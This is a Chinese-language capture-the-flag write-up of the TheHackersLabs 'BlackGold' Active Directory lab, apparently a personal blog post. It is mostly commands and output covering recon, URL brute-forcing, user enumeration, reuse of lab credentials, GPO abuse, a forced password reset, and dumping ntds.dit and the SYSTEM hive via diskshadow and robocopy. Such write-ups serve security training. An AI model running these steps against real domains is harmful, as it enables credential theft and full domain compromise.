{"pageProps":{"postData":{"id":"TheHackersLabsBlackGold","contentHtml":"<h1>BlackGold</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/9\">https://labs.thehackerslabs.com/machine/9</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:30 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00030s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00031s latency).\nMAC Address: 08:00:27:B8:0A:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.10\nHost is up (0.00038s latency).\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.5\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 28.11 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  BlackGold nmap -sT -min-rate 10000 -p- 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:32 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.10\nHost is up (0.00066s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n65047/tcp open  unknown\n65051/tcp open  unknown\n65052/tcp open  unknown\n65062/tcp open  unknown\n65071/tcp open  unknown\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.45 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  BlackGold nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:33 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.10\nHost is up (0.00038s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title:  Neptune\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-07-14 16:33:43Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n65047/tcp open  msrpc         Microsoft Windows RPC\n65051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n65052/tcp open  msrpc         Microsoft Windows RPC\n65062/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-07-14T16:34:35\n|_  start_date: N/A\n|_nbstat: NetBIOS name: DC01, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:31:d9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: -2s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.38 ms 192.168.56.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 111.63 seconds\n</code></pre>\n<p>访问 <code>HTTP</code> 服务，通过<code>IIS</code>搭建</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image1.png\" alt=\"image.png\"></p>\n<p>目录扫描，没发现什么可疑的文件夹</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 151] [--> http://192.168.56.10/images/]\n/docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/docs/]\n/Images               (Status: 301) [Size: 151] [--> http://192.168.56.10/Images/]\n/css                  (Status: 301) [Size: 148] [--> http://192.168.56.10/css/]\n/js                   (Status: 301) [Size: 147] [--> http://192.168.56.10/js/]\n/Docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/Docs/]\n/fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/fonts/]\n/IMAGES               (Status: 301) [Size: 151] [--> http://192.168.56.10/IMAGES/]\n/Fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/Fonts/]\n/CSS                  (Status: 301) [Size: 148] [--> http://192.168.56.10/CSS/]\n/JS                   (Status: 301) [Size: 147] [--> http://192.168.56.10/JS/]\n/DOCS                 (Status: 301) [Size: 149] [--> http://192.168.56.10/DOCS/]\nProgress: 661677 / 661680 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>页面拉到下面可以下载 <code>PDF</code> 文件</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image2.png\" alt=\"image.png\"></p>\n<p>图片上两个<code>PDF</code>内容都都是无用的，我们检查一下<code>PDF</code>元信息</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold pdfinfo 2024-02-15.pdf \nTitle:           Certificado de Cumplimiento de Normativas Ambientales\nSubject:         \nKeywords:        \nAuthor:          James Clear\nCreator:         Neptune Oil &#x26; Gas\nProducer:        pdf-lib (https://github.com/Hopding/pdf-lib)\nCreationDate:    Thu Feb 15 11:00:00 2024 CST\nModDate:         \nCustom Metadata: no\nMetadata Stream: no\nTagged:          <span class=\"hljs-built_in\">yes</span>\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           2\nEncrypted:       no\nPage size:       596 x 842 pts (A4)\nPage rot:        0\nFile size:       58258 bytes\nOptimized:       no\nPDF version:     1.7\n\n➜  BlackGold pdfinfo 2024-11-29.pdf \nTitle:           Informe de Sostenibilidad 2024\nSubject:         Informe sobre sostenibilidad y reducción de emisiones de CO2\nKeywords:        \nAuthor:          David Brown\nCreator:         Neptune Oil &#x26; Gas\nProducer:        ReportLab PDF Library - www.reportlab.com\nCreationDate:    Thu Feb 27 06:07:22 2025 CST\nModDate:         Thu Feb 27 06:07:22 2025 CST\nCustom Metadata: no\nMetadata Stream: no\nTagged:          no\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           1\nEncrypted:       no\nPage size:       612 x 792 pts (letter)\nPage rot:        0\nFile size:       2110 bytes\nOptimized:       no\nPDF version:     1.5\n</code></pre>\n<p>作者信息中能得到两个用户名<code>David.Brown</code> 和 <code>James.Clear</code> ，可能是域用户</p>\n<h2><strong>AS_REP Roasting ❌</strong></h2>\n<p>得到两个用户名，首先尝试一下 ****<code>AS_REP Roasting</code></p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold GetNPUsers.py -dc-ip 192.168.56.10 -dc-host neptune.thl nwptune.htl/ -usersfile users.txt\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved <span class=\"hljs-keyword\">for</span> future use)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved <span class=\"hljs-keyword\">for</span> future use)\n</code></pre>\n<h2>路径爆破</h2>\n<p>观察到下载<code>PDF</code>的路径是：<code>http://192.168.56.10/docs/2024-11-29.pdf</code></p>\n<p>是根据日期命名，我们尝试一下通过日期爆破一下</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image3.png\" alt=\"image.png\"></p>\n<p>最后能爆破到<code>192</code>个<code>PDF</code>文档</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image4.png\" alt=\"image.png\"></p>\n<p>这里使用<code>yakit</code>无法导出文件，所以还是需要写<code>python</code>脚本来爆破…</p>\n<pre><code class=\"hljs language-bash\">import requests\nimport datetime\nimport os\n\n<span class=\"hljs-comment\"># --- 配置 ---</span>\nHOST = <span class=\"hljs-string\">\"192.168.56.10\"</span>\nPORT = 80  <span class=\"hljs-comment\"># 根据需要修改 HTTP 端口</span>\nBASE_URL = f<span class=\"hljs-string\">\"http://{HOST}:{PORT}\"</span>\n\nSTART_YEAR = 2023\nEND_YEAR = 2024  <span class=\"hljs-comment\"># 实际会检查到 2025 年</span>\n\n<span class=\"hljs-comment\"># 保存下载文件的目录名</span>\nOUTPUT_DIR = <span class=\"hljs-string\">\"found_pdfs\"</span>\n\n<span class=\"hljs-comment\"># --- 主逻辑 ---</span>\ndef fuzz_and_download():\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n    遍历指定日期范围，尝试下载 PDF 文件。\n    如果服务器返回 200 状态码，则将文件保存到本地。\n    \"</span><span class=\"hljs-string\">\"\"</span>\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] 开始爆破目标: {BASE_URL}\"</span>)\n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] 找到的 PDF 将保存在 ./{OUTPUT_DIR}/ 目录中\"</span>)\n\n    <span class=\"hljs-comment\"># 1. 如果输出目录不存在，则创建它</span>\n    <span class=\"hljs-keyword\">if</span> not os.path.exists(OUTPUT_DIR):\n        os.makedirs(OUTPUT_DIR)\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] 已创建目录: {OUTPUT_DIR}\"</span>)\n\n    found_files_count = 0\n\n    <span class=\"hljs-comment\"># 2. 遍历所有可能的日期</span>\n    <span class=\"hljs-keyword\">for</span> year <span class=\"hljs-keyword\">in</span> range(START_YEAR, END_YEAR + 1):\n        <span class=\"hljs-keyword\">for</span> month <span class=\"hljs-keyword\">in</span> range(1, 13):\n            <span class=\"hljs-keyword\">for</span> day <span class=\"hljs-keyword\">in</span> range(1, 32):\n                \n                <span class=\"hljs-comment\"># 验证日期是否有效，跳过如 2月30日 等</span>\n                try:\n                    datetime.date(year, month, day)\n                except ValueError:\n                    <span class=\"hljs-built_in\">continue</span>\n\n                <span class=\"hljs-comment\"># 格式化日期和 URL</span>\n                date_str = f<span class=\"hljs-string\">\"{year}-{month:02d}-{day:02d}\"</span>\n                filename = f<span class=\"hljs-string\">\"{date_str}.pdf\"</span>\n                url_path = f<span class=\"hljs-string\">\"/docs/{filename}\"</span>\n                full_url = f<span class=\"hljs-string\">\"{BASE_URL}{url_path}\"</span>\n\n                try:\n                    <span class=\"hljs-comment\"># 打印单行进度条，end='\\r' 让光标回到行首，实现动态更新</span>\n                    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] 正在尝试: {full_url}   \"</span>, end=<span class=\"hljs-string\">'\\r'</span>)\n\n                    <span class=\"hljs-comment\"># 发送请求，stream=True 用于下载大文件，不会一次性读入内存</span>\n                    response = requests.get(full_url, <span class=\"hljs-built_in\">timeout</span>=5, stream=True)\n\n                    <span class=\"hljs-comment\"># 3. 如果状态码为 200，则保存文件</span>\n                    <span class=\"hljs-keyword\">if</span> response.status_code == 200:\n                        <span class=\"hljs-comment\"># 打印成功信息（在新的一行，避免被进度条覆盖）</span>\n                        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"\\n[+] 成功! 找到文件: {full_url} (状态码: 200)\"</span>)\n                        \n                        <span class=\"hljs-comment\"># 定义本地保存路径</span>\n                        file_path = os.path.join(OUTPUT_DIR, filename)\n                        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"    -> 正在保存到: {file_path}...\"</span>)\n\n                        <span class=\"hljs-comment\"># 以二进制写模式 ('wb') 打开文件并写入内容</span>\n                        with open(file_path, <span class=\"hljs-string\">'wb'</span>) as f:\n                            <span class=\"hljs-keyword\">for</span> chunk <span class=\"hljs-keyword\">in</span> response.iter_content(chunk_size=8192):\n                                f.write(chunk)\n                        \n                        found_files_count += 1\n\n                except requests.exceptions.RequestException as e:\n                    <span class=\"hljs-comment\"># 如果发生连接错误，打印出来</span>\n                    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"\\n[!] 连接错误: {full_url} - {e}\"</span>)\n    \n    <span class=\"hljs-comment\"># 4. 结束时打印总结</span>\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n\\n[*] 爆破完成。\"</span>)\n    <span class=\"hljs-keyword\">if</span> found_files_count > 0:\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[*] 共下载了 {found_files_count} 个 PDF 文件到 '{OUTPUT_DIR}' 目录。\"</span>)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] 未找到任何可用的文件。\"</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    fuzz_and_download()\n</code></pre>\n<h2>用户枚举</h2>\n<p>将作者 <code>author</code> 和 <code>Creator</code> 信息截取出来</p>\n<pre><code class=\"hljs language-bash\">exiftool PDF/found_pdfs/* | grep -E <span class=\"hljs-string\">'Author|Creator'</span> | grep -v <span class=\"hljs-string\">'Neptune Oil &#x26; Gas'</span> | <span class=\"hljs-built_in\">cut</span> -d: -f 2 | sed <span class=\"hljs-string\">'s/^ *//'</span> | <span class=\"hljs-built_in\">sort</span> | <span class=\"hljs-built_in\">uniq</span> > users.txt\n</code></pre>\n<p>使用<code>kerbrute</code> 枚举</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold kerbrute -<span class=\"hljs-built_in\">users</span> users.txt -domain neptune.thl -dc-ip 192.168.56.10\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Valid user => Lucas.Miller\n[*] No passwords were discovered :<span class=\"hljs-string\">'(\n</span></code></pre>\n<p>找到用户名<code>Lucas.Miller</code></p>\n<p>再尝试一下再<code>PDF</code>文件中读取有关<code>Lucas.Miller</code> 的</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold pdfgrep -i <span class=\"hljs-string\">'Lucas.Miller'</span> PDF/found_pdfs/*     \nPDF/found_pdfs/2023-01-12.pdf:Estimado Lucas Miller,\nPDF/found_pdfs/2023-01-12.pdf:   ● Nombre de usuario (Usuario AD): lucas.miller@neptune.thl\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image5.png\" alt=\"image.png\"></p>\n<p>得到一串密码 <code>E@6q%TnR7UEQSXywr8^@</code></p>\n<p>测试凭据是否有效</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold nxc smb neptune.thl -u <span class=\"hljs-string\">'Lucas.Miller'</span> -p <span class=\"hljs-string\">'E@6q%TnR7UEQSXywr8^@'</span>\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n\n➜  BlackGold nxc ldap neptune.thl -u <span class=\"hljs-string\">'Lucas.Miller'</span> -p <span class=\"hljs-string\">'E@6q%TnR7UEQSXywr8^@'</span>\nLDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\nLDAP        192.168.56.10   389    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n</code></pre>\n<h2>域分析</h2>\n<p>上 <code>BloodHound</code> 分析一波</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold bloodhound-python -d <span class=\"hljs-string\">'neptune.thl'</span> -ns 192.168.56.10 --zip -c All -dc <span class=\"hljs-string\">'DC01.neptune.thl'</span> -u <span class=\"hljs-string\">'Lucas.Miller'</span> -p <span class=\"hljs-string\">'E@6q%TnR7UEQSXywr8^@'</span> \nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: neptune.thl\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 8 <span class=\"hljs-built_in\">users</span>\nINFO: Found 53 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.neptune.thl\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 01S\nINFO: Compressing output into 20250715122943_bloodhound.zip\n</code></pre>\n<p><code>users</code> 组</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image6.png\" alt=\"image.png\"></p>\n<p>观察了一下，用户<code>Victor Rodriguez</code> 的密码写在了<code>Description</code> 上</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image7.png\" alt=\"image.png\"></p>\n<p>并且其属于<code>IT</code>组，在<code>SMB</code>中有一个<code>IT</code>的共享文件夹</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image8.png\" alt=\"image.png\"></p>\n<p>远程管理组用户有两个，暂时是横向目标</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image9.png\" alt=\"image.png\"></p>\n<h2>横向移动</h2>\n<h3>To emma.johnson</h3>\n<p>测试上面的凭据</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold nxc smb neptune.thl -u <span class=\"hljs-string\">'Victor.Rodriguez'</span> -p <span class=\"hljs-string\">'H5gVCzzZkzJ#wGsT8u1$'</span>\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Victor.Rodriguez:H5gVCzzZkzJ#wGsT8u1$\n</code></pre>\n<p><code>SMB</code>里面能得到一个<code>powershell</code>脚本</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold smbclient //192.168.56.10/IT -U neptune.thl/Victor.Rodriguez%<span class=\"hljs-string\">'H5gVCzzZkzJ#wGsT8u1$'</span>            \nTry <span class=\"hljs-string\">\"help\"</span> to get a list of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">ls</span>\n  .                                   D        0  Thu Feb 27 08:14:40 2025\n  ..                                DHS        0  Fri Feb 28 03:52:00 2025\n  Scripts                             D        0  Thu Feb 27 08:16:55 2025\n\n                10540543 blocks of size 4096. 7161242 blocks available\nsmb: \\> <span class=\"hljs-built_in\">cd</span> Scripts\\\nsmb: \\Scripts\\> <span class=\"hljs-built_in\">ls</span>\n  .                                   D        0  Thu Feb 27 08:16:55 2025\n  ..                                  D        0  Thu Feb 27 08:14:40 2025\n  backup.ps1                          A     1957  Thu Feb 27 08:20:11 2025\n\n                10540543 blocks of size 4096. 7161244 blocks available\nsmb: \\Scripts\\> get backup.ps1 \ngetting file \\Scripts\\backup.ps1 of size 1957 as backup.ps1 (382.2 KiloBytes/sec) (average 382.2 KiloBytes/sec)\n</code></pre>\n<p>打开后能得到用户<code>emma.johnson</code> 的凭据，密码：<code>sb9TVndq8N@tUVMmP2@#</code></p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image10.png\" alt=\"image.png\"></p>\n<p><code>emma.johnson</code> 是我们在上面看到在远程管理组里面的用户</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold nxc winrm neptune.thl -u <span class=\"hljs-string\">'emma.johnson'</span> -p <span class=\"hljs-string\">'sb9TVndq8N@tUVMmP2@#'</span>\nWINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.10   5985   DC01             [+] neptune.thl\\emma.johnson:sb9TVndq8N@tUVMmP2@# (Pwn3d!)\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image11.png\" alt=\"image.png\"></p>\n<p>该用户能得到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Emma Johnson\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\na5xxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h3>To thomas.brown</h3>\n<p>当前用户权限</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image12.png\" alt=\"image.png\"></p>\n<p>下一个用户包是<code>Thomas Brown</code> ，因为他属于<code>BACKUP OPERATORS</code></p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image13.png\" alt=\"image.png\"></p>\n<p>重新导入下<code>BloodHound</code>的数据</p>\n<pre><code class=\"hljs language-bash\">\tbloodhound-python -d <span class=\"hljs-string\">'neptune.thl'</span> -ns 192.168.56.10 --zip -c All -dc <span class=\"hljs-string\">'DC01.neptune.thl'</span> -u <span class=\"hljs-string\">'emma.johnson'</span> -p <span class=\"hljs-string\">'sb9TVndq8N@tUVMmP2@#'</span>\n</code></pre>\n<h3>GPO 滥用 <strong>❌</strong></h3>\n<p>能看到<code>emma.johnson</code> 有新的权限</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image14.png\" alt=\"image.png\"></p>\n<p>该组策略影响很多用户</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image15.png\" alt=\"image.png\"></p>\n<p>使用<code>bloodyAD</code>来实现</p>\n<p>赋予<code>emma.johnson</code>自己拥有对该 <code>GPO</code> 的 <code>genericAll</code> 权限</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold bloodyAD -d <span class=\"hljs-string\">'neptune.thl'</span> --dc-ip 192.168.56.10 -u <span class=\"hljs-string\">'emma.johnson'</span> -p <span class=\"hljs-string\">'sb9TVndq8N@tUVMmP2@#'</span> add genericAll <span class=\"hljs-string\">'CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL'</span> <span class=\"hljs-string\">'emma.johnson'</span>\n[+] emma.johnson has now GenericAll on CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL\n</code></pre>\n<p>这里很奇怪，这里使用了好几个工具也无法利用</p>\n<pre><code class=\"hljs language-bash\">python3 GPOwned.py -u <span class=\"hljs-string\">'emma.johnson'</span> -p <span class=\"hljs-string\">'sb9TVndq8N@tUVMmP2@#'</span> -d <span class=\"hljs-string\">'neptune.thl'</span> -dc-ip <span class=\"hljs-string\">'192.168.56.10'</span> -gpcmachine -gpoimmtask -name <span class=\"hljs-string\">'{037ECEDE-7C98-4D00-95D5-4283F4271B0D}'</span> -author <span class=\"hljs-string\">'neptune.thl\\Administrador'</span> -taskname <span class=\"hljs-string\">'Beautiful IOC'</span> -taskdescription <span class=\"hljs-string\">'Hello World'</span> -dstpath <span class=\"hljs-string\">'c:\\windows\\system32\\calc.exe'</span>\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image16.png\" alt=\"image.png\"></p>\n<p>最后看了<code>WP</code>发现人家的和我不一样</p>\n<h3>Force Change PassWord</h3>\n<p>这里重新导入了一下机器，然后再次导入新的数据，就可以看到<code>emma.johnson</code>可以修改<code>thomas</code>的密码</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image17.png\" alt=\"image.png\"></p>\n<p>通过 <code>BloodAD</code>修改密码</p>\n<pre><code class=\"hljs language-bash\">➜  BlackGold bloodyAD -d <span class=\"hljs-string\">'neptune.thl'</span> --dc-ip 192.168.56.10 -u <span class=\"hljs-string\">'emma.johnson'</span> -p <span class=\"hljs-string\">'sb9TVndq8N@tUVMmP2@#'</span> <span class=\"hljs-built_in\">set</span> password thomas.brown Admin@123\n[+] Password changed successfully!\n</code></pre>\n<p>登录<code>thomas.brown</code>账户</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image18.png\" alt=\"image.png\"></p>\n<h3>转储 NTDS</h3>\n<p>上面我们就知道<code>thomas.brown</code> 属于<code>BACKUP OPERATORS</code> 组</p>\n<p><code>whoami</code>信息中也能看出来</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image19.png\" alt=\"image.png\"></p>\n<p>利用：<a href=\"https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe\">https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe</a></p>\n<p>因为<code>winrm</code>是非交互会话，我们需要对其进行修改</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"set context persistent nowriters\"</span> > C:\\Windows\\Temp\\ntds_shadow.txt\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"add volume C: alias shadow_c\"</span> >> C:\\Windows\\Temp\\ntds_shadow.txt\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"create\"</span> >> C:\\Windows\\Temp\\ntds_shadow.txt\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"expose %shadow_c% Z:\"</span> >> C:\\Windows\\Temp\\ntds_shadow.txt\ndiskshadow /s C:\\Windows\\Temp\\ntds_shadow.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\">robocopy /B Z:\\Windows\\NTDS\\ C:\\rev ntds.dit\nrobocopy /B Z:\\Windows\\System32\\config\\ C:\\rev SYSTEM\n</code></pre>\n<p>再通过 <code>secretdump</code> 转储出来</p>\n<p><img src=\"/post-images/TheHackersLabsBlackGold/image20.png\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>常规思路，除了有些坑</p>","title":"TheHackersLabs - BlackGold","date":"2025-07-15","updated":"2025-07-15","tags":["TheHackersLabs","Windows","NTDS","exiftool","Domain","AD"],"categories":"靶机","comments":true,"description":"BlackGold\n\n https://labs.thehackerslabs.com/machine/9\n \n\n\n\nRecon\n\n端口扫描\n\n\n\n\n\n\n\n访问 `HTTP` 服务，通过`IIS`搭建\n\n\n\n目录扫描，没发现什么可疑的文件夹\n\n\n\n页面拉到下面可以下载 `PDF` 文件\n\n\n\n图片上两个`PDF`内容都都是无用的，我们检查一下`PDF`元信息\n\n\n\n作者信息中能得到两个用户名`Da..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - 